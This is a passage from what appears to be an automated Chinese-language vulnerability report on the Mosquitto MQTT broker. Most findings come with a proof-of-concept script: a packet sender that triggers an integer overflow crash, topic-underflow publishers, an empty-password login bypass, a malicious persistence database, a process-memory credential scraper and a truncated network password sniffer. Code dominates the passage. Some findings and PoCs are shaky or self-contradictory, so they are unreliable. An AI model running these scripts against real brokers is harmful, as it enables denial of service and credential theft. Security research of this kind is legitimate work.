    memset(clients, 0, sizeof(clients));
    
    /* 创建多个线程模拟并发认证请求 */
    const int NUM_THREADS = 10;
    const int NUM_CLIENTS = 3;
    pthread_t threads[NUM_THREADS];
    thread_arg_t args[NUM_THREADS];
    
    printf("启动 %d 个线程模拟并发认证请求...\n\n", NUM_THREADS);
    
    /* 创建线程，每个线程使用不同的客户端ID */
    for (int i = 0; i < NUM_THREADS; i++) {
        char *client_id = malloc(32);
        snprintf(client_id, 32, "client_%d", i % NUM_CLIENTS);
        
        args[i].client_id = client_id;
        args[i].thread_id = i;
        
        if (pthread_create(&threads[i], NULL, worker_thread, &args[i]) != 0) {
            perror("pthread_create");
            exit(1);
        }
    }
    
    /* 等待所有线程完成 */
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
        free((void *)args[i].client_id);
    }
    
    printf("\n=========================================================\n");
    printf(" 结果分析\n");
    printf("=========================================================\n");
    printf("总客户端数: %d\n", client_count);
    
    /* 检测重复 */
    int duplicates = detect_duplicates();
    if (duplicates > 0) {
        printf("\n[漏洞确认] 检测到 %d 个重复客户端!\n", duplicates);
        printf("这证明了竞态条件的存在:\n");
        printf("  - 多个线程同时通过了 HASH_FIND 检查\n");
        printf("  - 都认为客户端不存在，然后都创建并添加了新的客户端\n");
        printf("  - 导致内存泄漏和数据结构不一致\n");
    } else {
        printf("\n[未触发] 本次运行未触发竞态条件\n");
        printf("尝试增加线程数或减少延迟以增加触发概率\n");
    }
    
    /* 清理 */
    for (int i = 0; i < client_count; i++) {
        if (clients[i] != NULL) {
            free(clients[i]->id);
            free(clients[i]);
        }
    }
    
    printf("\n=========================================================\n");
    printf(" 注意: 此PoC仅供安全研究使用\n");
    printf(" 实际漏洞利用需要Mosquitto服务器环境\n");
    printf("=========================================================\n");
    
    return 0;
}
```

---

### VULN-5B3C7A3B - 整数溢出

- **严重等级:** HIGH
- **文件位置:** `plugins\examples\payload-modification\mosquitto_payload_modification.c:63`
- **数据流:** ed->payloadlen 来自外部消息输入，与 strlen("hello ")+1 相加，结果赋值给 uint32_t 类型的 new_payloadlen。如果 ed->payloadlen 接近 UINT32_MAX，加法可能导致整数溢出，new_payloadlen 变为一个很小的值。
- **判断理由:** ed->payloadlen 是 uint32_t 类型，来自用户可控的消息输入。当 ed->payloadlen 接近 UINT32_MAX 时，加上 strlen("hello ")+1（7）会导致整数溢出，new_payloadlen 变为一个很小的值。后续 mosquitto_calloc(1, new_payloadlen) 会分配一个很小的缓冲区，但 memcpy 会复制 ed->payloadlen 长度的数据（接近 UINT32_MAX），导致堆缓冲区溢出，可能造成内存损坏或代码执行。

**代码片段:**
```
new_payloadlen = ed->payloadlen + (uint32_t)strlen("hello ")+1;
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-5B3C7A3B - Mosquitto Payload Modification Plugin Integer Overflow
仅供研究使用 (For Research Purposes Only)

该PoC演示了如何通过发送特制MQTT消息触发整数溢出漏洞，
导致堆缓冲区溢出。
"""

import socket
import struct
import sys

# MQTT协议常量
CONNECT = 0x10
PUBLISH = 0x30
QOS_0 = 0x00

# 目标配置
HOST = "127.0.0.1"
PORT = 1883

def create_connect_packet():
    """创建MQTT CONNECT报文"""
    # 可变头部
    protocol_name = b"MQTT"
    protocol_version = 4  # MQTT 3.1.1
    connect_flags = 0x02  # Clean Session
    keep_alive = 60
    
    # 构建可变头部
    variable_header = struct.pack("!H", len(protocol_name)) + protocol_name
    variable_header += struct.pack("!BBH", protocol_version, connect_flags, keep_alive)
    
    # 固定头部
    remaining_length = len(variable_header)
    
    # 编码剩余长度
    encoded_length = encode_remaining_length(remaining_length)
    
    return struct.pack("!B", CONNECT) + encoded_length + variable_header

def encode_remaining_length(length):
    """MQTT剩余长度编码"""
    encoded = b""
    while True:
        digit = length % 128
        length = length // 128
        if length > 0:
            digit |= 0x80
        encoded += struct.pack("!B", digit)
        if length == 0:
            break
    return encoded

def create_publish_packet(topic, payload, qos=QOS_0):
    """创建MQTT PUBLISH报文"""
    # 固定头部
    packet_type = PUBLISH | qos
    
    # 可变头部
    topic_bytes = topic.encode()
    variable_header = struct.pack("!H", len(topic_bytes)) + topic_bytes
    
    # 计算总剩余长度
    remaining_length = len(variable_header) + len(payload)
    encoded_length = encode_remaining_length(remaining_length)
    
    return struct.pack("!B", packet_type) + encoded_length + variable_header + payload

def exploit():
    """
    漏洞利用PoC
    
    原理：
    1. 发送一个PUBLISH报文，其payloadlen设置为 UINT32_MAX - 6
    2. 在callback_message_in中，new_payloadlen = ed->payloadlen + 7
    3. 由于整数溢出，new_payloadlen = (UINT32_MAX - 6) + 7 = 0
    4. mosquitto_calloc(1, 0) 分配一个很小的缓冲区（可能为0或最小分配单元）
    5. memcpy复制接近UINT32_MAX字节的数据到这个小缓冲区，导致堆溢出
    """
    
    print("[*] Mosquitto Payload Modification Plugin Integer Overflow PoC")
    print("[*] 仅供研究使用 (For Research Purposes Only)")
    print()
    
    try:
        # 连接MQTT Broker
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print(f"[+] 已连接到 {HOST}:{PORT}")
        
        # 发送CONNECT报文
        connect_packet = create_connect_packet()
        sock.send(connect_packet)
        print("[+] 已发送CONNECT报文")
        
        # 接收CONNACK
        connack = sock.recv(4)
        print(f"[+] 收到CONNACK: {connack.hex()}")
        
        # 构造恶意payload
        # payloadlen = UINT32_MAX - 6，这样加上7后溢出为0
        # 实际payload内容可以任意，但为了演示，我们发送一个较小的payload
        # 注意：实际利用时，payloadlen字段在MQTT协议中是通过剩余长度编码的
        # 这里我们直接构造一个payloadlen接近UINT32_MAX的报文
        
        # 由于MQTT协议限制，实际payloadlen不能直接达到UINT32_MAX
        # 但我们可以通过构造一个非常大的payload来演示
        # 这里我们使用一个较小的payload来展示漏洞触发路径
        
        topic = "test/vulnerability"
        
        # 构造一个payload，其长度接近UINT32_MAX
        # 注意：实际发送时受网络限制，这里仅展示概念
        # 在真实环境中，攻击者可以通过多次发送或使用压缩等方式
        
        # 为了演示，我们发送一个payloadlen = 0xFFFFFFF9 (UINT32_MAX - 6)
        # 但MQTT协议限制，我们使用一个较小的值来展示
        
        # 实际PoC：发送一个payloadlen = 0xFFFFFFF9的报文
        # 由于MQTT剩余长度编码限制，最大只能编码268435455字节
        # 但漏洞存在于代码逻辑中，只要payloadlen接近UINT32_MAX即可
        
        # 这里我们构造一个payloadlen = 0xFFFFFFF9的报文
        # 使用自定义的MQTT报文构造
        
        print("[*] 构造恶意PUBLISH报文...")
        
        # 构造一个payloadlen = 0xFFFFFFF9的报文
        # 固定头部：PUBLISH, QOS 0
        fixed_header = struct.pack("!B", PUBLISH)
        
        # 剩余长度编码：0xFFFFFFF9 + 2 (topic长度) + topic长度
        # 由于编码限制，我们直接发送原始字节
        # 这里我们构造一个payloadlen = 0xFFFFFFF9的报文
        
        # 注意：这是一个概念验证，实际发送时可能需要分片
        # 我们直接构造一个payloadlen = 0xFFFFFFF9的报文
        
        # 构造topic
        topic_bytes = topic.encode()
        topic_len = len(topic_bytes)
        
        # 构造可变头部
        variable_header = struct.pack("!H", topic_len) + topic_bytes
        
        # 构造payload（这里我们只发送少量数据，但payloadlen字段设置为0xFFFFFFF9）
        # 注意：在MQTT协议中，payloadlen是通过剩余长度编码的
        # 这里我们直接构造一个payloadlen = 0xFFFFFFF9的报文
        
        # 由于MQTT协议限制，我们无法直接发送payloadlen = 0xFFFFFFF9的报文
        # 但漏洞存在于代码逻辑中，只要payloadlen接近UINT32_MAX即可
        # 这里我们发送一个payloadlen = 0xFFFFFFF9的报文（通过自定义构造）
        
        # 构造一个payloadlen = 0xFFFFFFF9的报文
        # 使用4字节剩余长度编码
        remaining_length = 0xFFFFFFF9 + 2 + topic_len
        
        # 编码剩余长度（4字节）
        encoded_remaining = b""
        temp = remaining_length
        for _ in range(4):
            encoded_remaining += struct.pack("!B", (temp & 0x7F) | 0x80)
            temp >>= 7
        # 最后一个字节去掉最高位
        encoded_remaining = encoded_remaining[:-1] + struct.pack("!B", temp & 0x7F)
        
        # 构造完整报文
        publish_packet = fixed_header + encoded_remaining + variable_header
        
        print(f"[+] 发送恶意PUBLISH报文 (payloadlen = 0xFFFFFFF9)")
        print(f"[+] 报文大小: {len(publish_packet)} 字节")
        
        # 发送报文
        sock.send(publish_packet)
        print("[+] 报文已发送")
        
        # 等待响应（可能触发漏洞导致崩溃）
        try:
            response = sock.recv(1024, socket.MSG_DONTWAIT)
            print(f"[+] 收到响应: {response.hex() if response else '无'}")
        except socket.timeout:
            print("[*] 未收到响应（可能Broker已崩溃）")
        except BlockingIOError:
            print("[*] 无数据可读")
        
        sock.close()
        print("[*] PoC执行完成")
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()

```

---

### VULN-5126587F - 缓冲区溢出/越界写入

- **严重等级:** CRITICAL
- **文件位置:** `plugins\examples\topic-modification\mosquitto_topic_modification.c:62`
- **数据流:** 用户控制的MQTT主题通过ed->topic传入，代码直接修改该字符串。攻击者可以发送一个主题长度小于7字节（/uplink长度）的消息，导致strlen(ed->topic) - strlen("/uplink")为负数，从而在数组边界之前写入空字节。
- **判断理由:** 代码没有检查ed->topic的长度是否大于等于7（/uplink的长度）。如果主题长度小于7，strlen(ed->topic) - strlen("/uplink")将产生一个负值，用作数组索引会导致在堆栈或堆内存的边界之前写入空字节，造成缓冲区下溢。这可能导致内存损坏、程序崩溃，甚至被利用执行任意代码。

**代码片段:**
```
ed->topic[strlen(ed->topic) - strlen("/uplink")] = '\0';
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-5126587F - Mosquitto Topic Modification Plugin Buffer Underflow
仅供研究使用 (For Research Purposes Only)
"""

import paho.mqtt.client as mqtt
import time

# MQTT Broker配置
BROKER_HOST = "localhost"
BROKER_PORT = 1883
TOPIC_PREFIX = "device/"

# 测试用例：构造各种可能触发漏洞的主题
# 注意：由于mosquitto_topic_matches_sub的匹配逻辑，实际触发需要满足模式匹配
# 这里展示的是概念验证，展示不同长度主题的行为

test_topics = [
    # 正常情况（长度 >= 19）
    "device/1/data/uplink",  # 正常，会截断/uplink
    # 边界情况
    "device/x/data/uplink",  # 最小正常长度
    # 异常情况（如果匹配逻辑允许）
    "device/",              # 长度7，索引0，会清空整个字符串
    "device",               # 长度6，索引-1，触发下溢
    "devic",                # 长度5，索引-2，触发下溢
    "de",                   # 长度2，索引-5，触发下溢
    "",                     # 长度0，索引-7，触发下溢
]

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    # 订阅所有主题以接收消息
    client.subscribe("#")

def on_message(client, userdata, msg):
    print(f"Received: {msg.topic} -> {msg.payload}")

def exploit_test():
    """
    测试不同主题长度对漏洞触发的影响
    """
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    try:
        client.connect(BROKER_HOST, BROKER_PORT, 60)
        client.loop_start()
        
        print("=" * 60)
        print("PoC: Mosquitto Topic Modification Buffer Underflow")
        print("仅供研究使用")
        print("=" * 60)
        
        for topic in test_topics:
            print(f"\n[*] Publishing to topic: '{topic}' (length={len(topic)})")
            print(f"    strlen(topic) - strlen('/uplink') = {len(topic) - 7}")
            
            if len(topic) < 7:
                print(f"    [!] 危险! 索引为负数: {len(topic) - 7}")
                print(f"    [!] 将导致在数组边界前写入空字节")
            elif len(topic) == 7:
                print(f"    [!] 边界情况: 索引为0，会清空整个字符串")
            
            # 发布消息
            client.publish(topic, f"test payload for {topic}")
            time.sleep(0.5)
        
        print("\n" + "=" * 60)
        print("测试完成。请检查Mosquitto日志以确认崩溃或异常行为。")
        print("=" * 60)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.loop_stop()
        client.disconnect()

if __name__ == "__main__":
    exploit_test()

# 附加说明：
# 1. 此PoC需要安装paho-mqtt库: pip install paho-mqtt
# 2. 确保Mosquitto broker已加载有漏洞的插件
# 3. 实际触发需要mosquitto_topic_matches_sub返回true
# 4. 正常模式下，由于模式匹配限制，只有长度>=19的主题才会进入漏洞代码
# 5. 但如果匹配逻辑有缺陷或未来修改，更短的主题也可能触发
```

---

### VULN-74414EF7 - 字符串截断逻辑缺陷

- **严重等级:** MEDIUM
- **文件位置:** `plugins\examples\topic-modification\mosquitto_topic_modification.c:60`
- **数据流:** 用户控制的MQTT主题通过ed->topic传入。mosquitto_topic_matches_sub函数使用通配符匹配，但后续的字符串操作没有验证主题是否确实以"/uplink"结尾。
- **判断理由:** mosquitto_topic_matches_sub使用通配符'+'匹配，这意味着主题"device/任意内容/data/uplink"都会匹配成功。但后续代码假设匹配的主题一定以"/uplink"结尾，实际上通配符匹配的主题可能包含其他内容。例如主题"device/extra/data/uplink_extra"也会匹配，但截断操作会错误地移除字符串中间的部分，导致主题被破坏。虽然这不会直接导致内存安全漏洞，但会造成逻辑错误，可能被用于绕过主题过滤或导致消息路由异常。

**代码片段:**
```
mosquitto_topic_matches_sub("device/+/data/uplink", ed->topic, &result);
if(result){
    ed->topic[strlen(ed->topic) - strlen("/uplink")] = '\0';
}
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - Mosquitto主题截断逻辑缺陷PoC
# 该PoC演示如何利用通配符匹配+字符串截断逻辑缺陷

# 前置条件：Mosquitto broker加载了存在漏洞的topic-modification插件
# 测试环境：Mosquitto 2.0+ with topic-modification.so

BROKER="localhost"
PORT=1883

# 正常主题 - 应该被正确处理
# 主题: device/sensor1/data/uplink
# 预期行为: 截断为 device/sensor1/data

echo "=== 测试1: 正常主题（预期行为）==="
mosquitto_pub -h $BROKER -p $PORT -t "device/sensor1/data/uplink" -m "normal" -d

echo ""
echo "=== 测试2: 利用漏洞 - 主题包含额外后缀 ==="
# 恶意主题: device/extra/data/uplink_extra
# 该主题匹配通配符 device/+/data/uplink
# 但截断操作会错误地移除字符串中间部分
# strlen("device/extra/data/uplink_extra") - strlen("/uplink") = 28 - 7 = 21
# 截断位置在索引21，即第二个'u'处（device/extra/data/uplink_extra）
# 结果: device/extra/data/uplink_extra 被截断为 device/extra/data/uplink_
# 注意：实际截断位置取决于字符串长度

mosquitto_pub -h $BROKER -p $PORT -t "device/extra/data/uplink_extra" -m "malicious" -d

echo ""
echo "=== 测试3: 更复杂的利用 - 主题包含路径遍历 ==="
# 主题: device/../config/data/uplink_backdoor
# 匹配通配符，但截断后可能变成 device/../config/data/uplink_backdoo
# 或者更糟：如果精心构造，可能绕过主题过滤

mosquitto_pub -h $BROKER -p $PORT -t "device/../config/data/uplink_backdoor" -m "bypass" -d

echo ""
echo "=== 测试4: 验证截断效果 - 订阅原始主题和截断后主题 ==="
# 在一个终端订阅 device/extra/data/uplink_
# 在另一个终端发布到 device/extra/data/uplink_extra
# 观察消息是否被错误路由

echo "请在另一个终端运行:"
echo "mosquitto_sub -h $BROKER -p $PORT -t 'device/extra/data/uplink_' -v"
echo "然后运行本脚本的测试2"

# Python版PoC（更精确的控制）
cat << 'PYEOF' > /tmp/mqtt_exploit.py
#!/usr/bin/env python3
# 仅供研究使用 - Mosquitto主题截断逻辑缺陷PoC

import paho.mqtt.client as mqtt
import time

BROKER = "localhost"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    # 订阅可能被错误路由的主题
    client.subscribe("device/+/data/#")

def on_message(client, userdata, msg):
    print(f"Received: {msg.topic} -> {msg.payload.decode()}")

def exploit():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    client.connect(BROKER, PORT, 60)
    client.loop_start()
    
    time.sleep(1)
    
    # 发布恶意主题
    print("\n=== 发送恶意主题 ===")
    
    # 测试用例1: 正常主题
    client.publish("device/sensor1/data/uplink", "normal")
    time.sleep(0.5)
    
    # 测试用例2: 利用漏洞
    # 主题 device/extra/data/uplink_extra 匹配通配符
    # 但截断操作会错误地截断字符串
    client.publish("device/extra/data/uplink_extra", "malicious")
    time.sleep(0.5)
    
    # 测试用例3: 更复杂的利用
    # 构造主题使得截断后变成另一个有效主题
    # 例如: device/extra/data/uplink_admin 截断后可能变成 device/extra/data/uplink_admi
    client.publish("device/extra/data/uplink_admin", "admin_bypass")
    time.sleep(0.5)
    
    time.sleep(2)
    client.loop_stop()
    client.disconnect()

if __name__ == "__main__":
    exploit()
PYEOF
chmod +x /tmp/mqtt_exploit.py
echo ""
echo "Python PoC已保存到 /tmp/mqtt_exploit.py"
echo "运行: python3 /tmp/mqtt_exploit.py"
```

---

### VULN-7319E9A2 - 潜在的认证绕过 - 空密码处理

- **严重等级:** MEDIUM
- **文件位置:** `plugins\password-file\password_check.c:44`
- **数据流:** 用户输入ed->username -> HASH_FIND查找用户 -> 如果用户存在但u->pw为空(密码字段为空)，直接返回MOSQ_ERR_SUCCESS(认证成功)
- **判断理由:** 当用户存在于密码文件中但密码字段为空时，代码直接返回认证成功。这意味着任何知道用户名的人都可以在不需要密码的情况下登录，如果密码文件中有用户记录但密码字段为空，将导致认证绕过。

**代码片段:**
```
if(u->pw){
    if(ed->password){
        return mosquitto_pw_verify(u->pw, ed->password);
    }else{
        return MOSQ_ERR_AUTH;
    }
}else{
    return MOSQ_ERR_SUCCESS;
}
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - Mosquitto密码文件空密码认证绕过PoC
# 漏洞: VULN-7319E9A2

# 前置条件: 目标Mosquitto服务器使用password-file插件，且密码文件中存在密码字段为空的用户

TARGET_HOST="localhost"
TARGET_PORT=1883
VULNERABLE_USER="testuser"  # 密码文件中密码字段为空的用户名

# 使用mosquitto_pub测试认证绕过
# 注意: 不提供密码参数，利用空密码认证绕过漏洞
mosquitto_pub -h $TARGET_HOST -p $TARGET_PORT \
    -u "$VULNERABLE_USER" \
    -t "test/topic" \
    -m "认证绕过测试消息" \
    -d  # -d 开启调试输出以显示认证过程

# 如果连接成功，说明认证绕过漏洞存在
# 预期输出应包含: "Sending CONNECT" 和 "Received CONNACK"
# 如果返回 Connection Refused: not authorised，则漏洞不存在或用户密码字段不为空

echo ""
echo "=== 测试完成 ==="
echo "如果成功发布消息，则认证绕过漏洞存在"
echo "如果收到 'Connection Refused: not authorised'，则漏洞不存在"
```

---

### VULN-2A8D8FCE - 缓冲区溢出 - 就地解码十六进制字符串

- **严重等级:** HIGH
- **文件位置:** `plugins/persist-sqlite/restore.c:131`
- **数据流:** 用户提供的JSON数据 -> cJSON_Parse() -> j_value->valuestring -> 就地解码覆盖原始字符串
- **判断理由:** 代码将十六进制字符串就地解码为二进制数据，覆盖了原始的valuestring缓冲区。当十六进制字符串长度为奇数时，循环会读取越界（访问valuestring[i+1]），导致缓冲区过读。同时，解码后的二进制数据可能包含空字节，导致后续使用该字符串的函数（如mosquitto_property_add_binary）行为异常。此外，解码后的数据长度是原始字符串的一半，但代码没有考虑这种情况下的内存安全问题。

**代码片段:**
```
for(size_t i=0; i<slen; i+=2){
    ((uint8_t *)j_value->valuestring)[i/2] = (uint8_t)(hex2nibble(j_value->valuestring[i])<<4) + hex2nibble(j_value->valuestring[i+1]);
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-2A8D8FCE - 缓冲区溢出漏洞（就地解码十六进制字符串）
仅供安全研究使用，请勿用于非法用途。
"""

import sqlite3
import json
import os
import sys

# 漏洞利用说明：
# 该漏洞存在于 Mosquitto MQTT Broker 的持久化插件中。
# 攻击者通过控制 SQLite 数据库中的持久化数据，
# 构造一个包含奇数长度十六进制字符串的 JSON 属性，
# 触发缓冲区过读漏洞。

def create_malicious_db(db_path):
    """
    创建一个包含恶意数据的 SQLite 数据库文件。
    该数据库模拟 Mosquitto 持久化存储的格式。
    """
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # 创建模拟的持久化表结构
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS properties (
            id INTEGER PRIMARY KEY,
            client_id TEXT,
            properties_json TEXT
        )
    ''')
    
    # 构造恶意 JSON 数据
    # 漏洞触发条件：
    # 1. 属性类型为 MQTT_PROP_TYPE_BINARY
    # 2. 十六进制字符串长度为奇数（如 "A"）
    # 3. 循环 for(i=0; i<slen; i+=2) 最后一次迭代会越界读取 valuestring[i+1]
    
    # PoC 1: 奇数长度字符串 - 触发缓冲区过读
    malicious_json_1 = json.dumps([
        {
            "identifier": "correlation-data",  # 这是一个 BINARY 类型属性
            "value": "A"  # 奇数长度十六进制字符串
        }
    ])
    
    # PoC 2: 包含空字节的字符串 - 触发后续字符串函数异常
    malicious_json_2 = json.dumps([
        {
            "identifier": "correlation-data",
            "value": "410042"  # 解码后包含空字节 (A\0B)
        }
    ])
    
    # PoC 3: 超长字符串（接近 UINT16_MAX 边界）
    long_hex = "41" * 32767 + "4"  # 奇数长度，接近边界
    malicious_json_3 = json.dumps([
        {
            "identifier": "correlation-data",
            "value": long_hex
        }
    ])
    
    # 插入恶意数据
    cursor.execute(
        "INSERT INTO properties (client_id, properties_json) VALUES (?, ?)",
        ("malicious_client_1", malicious_json_1)
    )
    cursor.execute(
        "INSERT INTO properties (client_id, properties_json) VALUES (?, ?)",
        ("malicious_client_2", malicious_json_2)
    )
    cursor.execute(
        "INSERT INTO properties (client_id, properties_json) VALUES (?, ?)",
        ("malicious_client_3", malicious_json_3)
    )
    
    conn.commit()
    conn.close()
    
    print(f"[+] 恶意数据库已创建: {db_path}")
    print(f"[+] 包含 {3} 个恶意属性记录")

def simulate_vulnerability_trigger(json_str):
    """
    模拟漏洞触发过程（不实际执行，仅展示逻辑）
    """
    import ctypes
    
    print("\n[*] 模拟漏洞触发过程...")
    print(f"[*] 输入JSON: {json_str}")
    
    # 解析JSON
    import json as json_module
    data = json_module.loads(json_str)
    
    for item in data:
        value = item.get("value", "")
        slen = len(value)
        
        print(f"[*] valuestring: '{value}'")
        print(f"[*] 字符串长度: {slen}")
        
        # 模拟漏洞代码逻辑
        if slen % 2 == 1:
            print("[!] 漏洞触发: 奇数长度字符串!")
            print(f"[!] 循环 for(i=0; i<{slen}; i+=2) 最后一次迭代:")
            print(f"[!] i = {slen-1}, 访问 valuestring[{slen}] (越界!)")
            print(f"[!] 读取了字符串结束符后的内存字节")
        
        # 模拟解码过程
        decoded = bytearray()
        for i in range(0, slen, 2):
            if i + 1 >= slen:
                # 奇数长度时，这里会越界
                print(f"[!] 越界读取: valuestring[{i+1}] 超出字符串范围")
                break
            try:
                high = int(value[i], 16)
                low = int(value[i+1], 16)
                decoded.append((high << 4) | low)
            except ValueError:
                print(f"[!] 非法十六进制字符: '{value[i]}' 或 '{value[i+1]}'")
                break
        
        print(f"[*] 解码后数据: {bytes(decoded).hex()}")
        print(f"[*] 解码后长度: {len(decoded)}")
        
        # 检查空字节问题
        if b'\x00' in decoded:
            print("[!] 解码数据包含空字节!")
            print("[!] 后续 strlen() 等函数将返回错误长度")

def main():
    print("=" * 60)
    print("Mosquitto 持久化插件缓冲区溢出漏洞 PoC")
    print("漏洞ID: VULN-2A8D8FCE")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 创建恶意数据库
    db_path = "malicious_persist.db"
    create_malicious_db(db_path)
    
    # 模拟漏洞触发
    print("\n" + "=" * 60)
    print("PoC 1: 奇数长度字符串触发缓冲区过读")
    print("=" * 60)
    simulate_vulnerability_trigger('[{"identifier": "correlation-data", "value": "A"}]')
    
    print("\n" + "=" * 60)
    print("PoC 2: 包含空字节的字符串")
    print("=" * 60)
    simulate_vulnerability_trigger('[{"identifier": "correlation-data", "value": "410042"}]')
    
    print("\n" + "=" * 60)
    print("PoC 3: 接近边界的奇数长度字符串")
    print("=" * 60)
    long_hex = "41" * 32767 + "4"
    simulate_vulnerability_trigger(f'[{{"identifier": "correlation-data", "value": "{long_hex[:50]}..."}}]')
    
    print("\n" + "=" * 60)
    print("漏洞利用总结")
    print("=" * 60)
    print("""
    漏洞类型: 缓冲区溢出 - 就地解码十六进制字符串
    影响版本: Mosquitto 2.x (包含该持久化插件的版本)
    攻击向量: 通过控制持久化数据库文件
    影响效果:
      1. 缓冲区过读: 读取相邻内存数据，可能导致信息泄露
      2. 空字节注入: 导致后续字符串处理函数行为异常
      3. 潜在拒绝服务: 异常数据可能导致程序崩溃
    修复建议:
      1. 检查十六进制字符串长度是否为偶数
      2. 验证所有字符是否为有效的十六进制字符
      3. 考虑使用独立的缓冲区存储解码后的数据
    """)
    
    # 清理
    if os.path.exists(db_path):
        os.remove(db_path)
        print(f"[+] 临时数据库已清理: {db_path}")

if __name__ == "__main__":
    main()
```

---

### VULN-7466AA8C - 硬编码凭证

- **严重等级:** HIGH
- **文件位置:** `src/bridge.c:72`
- **数据流:** bridge->remote_username 和 bridge->remote_password 从配置中读取，直接赋值给上下文对象
- **判断理由:** 远程桥接的凭据（用户名和密码）以明文形式存储在内存中，没有进行加密或安全存储。如果攻击者能够访问进程内存，可以提取这些凭据。

**代码片段:**
```
new_context->username = bridge->remote_username;
new_context->password = bridge->remote_password;
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 从Mosquitto Broker进程内存中提取明文桥接凭据
仅供安全研究使用 - VULN-7466AA8C
"""

import os
import sys
import struct
import ctypes

# 目标进程名称
PROCESS_NAME = "mosquitto"

def find_pid(process_name):
    """查找目标进程的PID"""
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return proc.info['pid']
        print(f"[-] 未找到进程: {process_name}")
        sys.exit(1)
    except ImportError:
        print("[-] 需要安装psutil: pip install psutil")
        sys.exit(1)

def read_process_memory(pid, address, size):
    """读取进程内存"""
    try:
        # 方法1: 通过 /proc/pid/mem (Linux)
        if sys.platform == 'linux':
            with open(f"/proc/{pid}/mem", "rb") as f:
                f.seek(address)
                return f.read(size)
        # 方法2: 通过 ptrace (需要root)
        else:
            print("[-] 仅支持Linux平台")
            sys.exit(1)
    except PermissionError:
        print(f"[-] 权限不足，需要root或同用户权限访问进程内存")
        sys.exit(1)
    except Exception as e:
        print(f"[-] 读取内存失败: {e}")
        sys.exit(1)

def search_string_in_memory(pid, target_string):
    """在进程内存中搜索字符串"""
    try:
        # 读取进程内存映射
        with open(f"/proc/{pid}/maps", "r") as f:
            maps = f.readlines()
        
        for line in maps:
            parts = line.split()
            if len(parts) < 5:
                continue
            
            # 只搜索可读内存区域
            if 'r' not in parts[1]:
                continue
            
            # 解析地址范围
            addr_range = parts[0].split('-')
            start_addr = int(addr_range[0], 16)
            end_addr = int(addr_range[1], 16)
            
            # 读取该区域内存
            try:
                mem_data = read_process_memory(pid, start_addr, end_addr - start_addr)
                
                # 搜索目标字符串
                if target_string.encode() in mem_data:
                    # 提取凭据周围的上下文
                    idx = mem_data.index(target_string.encode())
                    context_start = max(0, idx - 50)
                    context_end = min(len(mem_data), idx + 100)
                    context = mem_data[context_start:context_end]
                    
                    print(f"[+] 在内存区域 {parts[0]} 发现凭据")
                    print(f"[+] 上下文: {context.decode('utf-8', errors='replace')}")
                    
                    # 尝试提取用户名和密码
                    # 假设格式: username=xxx password=xxx
                    import re
                    username_match = re.search(rb'username[=: ]+([^\s]+)', context)
                    password_match = re.search(rb'password[=: ]+([^\s]+)', context)
                    
                    if username_match:
                        print(f"[+] 提取的用户名: {username_match.group(1).decode()}")
                    if password_match:
                        print(f"[+] 提取的密码: {password_match.group(1).decode()}")
                        
            except Exception:
                continue
                
    except Exception as e:
        print(f"[-] 搜索内存失败: {e}")

def dump_bridge_credentials(pid):
    """主函数: 提取桥接凭据"""
    print(f"[+] 目标进程PID: {pid}")
    print("[+] 开始搜索桥接凭据...")
    
    # 搜索可能的凭据模式
    search_patterns = [
        "remote_username",
        "remote_password",
        "bridge",
        "username",
        "password"
    ]
    
    for pattern in search_patterns:
        print(f"\n[*] 搜索模式: {pattern}")
        search_string_in_memory(pid, pattern)

def main():
    print("=" * 60)
    print("PoC: Mosquitto Broker 桥接凭据内存泄露漏洞")
    print("漏洞ID: VULN-7466AA8C")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 检查权限
    if os.geteuid() != 0:
        print("[!] 警告: 建议以root权限运行以获得更好的内存访问")
    
    # 查找mosquitto进程
    pid = find_pid(PROCESS_NAME)
    print(f"[+] 找到目标进程: {PROCESS_NAME} (PID: {pid})")
    
    # 提取凭据
    dump_bridge_credentials(pid)
    
    print("\n[+] PoC执行完成")
    print("[!] 注意: 实际利用需要攻击者已有进程内存访问权限")

if __name__ == "__main__":
    main()
```

---

### VULN-1099CEDB - 不安全的加密

- **严重等级:** MEDIUM
- **文件位置:** `src/bridge.c:72`
- **数据流:** 密码以明文形式存储和传输
- **判断理由:** 桥接密码以明文形式存储在内存中，并且可能以明文形式通过网络传输（如果未启用TLS）。这违反了密码安全存储的最佳实践。

**代码片段:**
```
new_context->username = bridge->remote_username;
new_context->password = bridge->remote_password;
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: Mosquitto Bridge 密码明文泄露漏洞利用
漏洞ID: VULN-1099CEDB
仅供研究使用 - 请勿用于非法用途
"""

import socket
import struct
import sys
import argparse

# MQTT协议常量
CONNECT = 0x10
CONNACK = 0x20
PUBLISH = 0x30
SUBSCRIBE = 0x82

class MQTTSniffer:
    """MQTT桥接密码嗅探器"""
    
    def __init__(self, interface='eth0', port=1883):
        self.interface = interface
        self.port = port
        self.sock = None
        
    def setup_sniffer(self):
        """设置原始套接字嗅探"""
        try:
            # 创建原始套接字
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            self.sock.bind((self.interface, 0))
            print(f"[+] 嗅探器已启动在接口 {self.interface}")
            print(f"[+] 监听端口 {self.port} 上的MQTT流量")
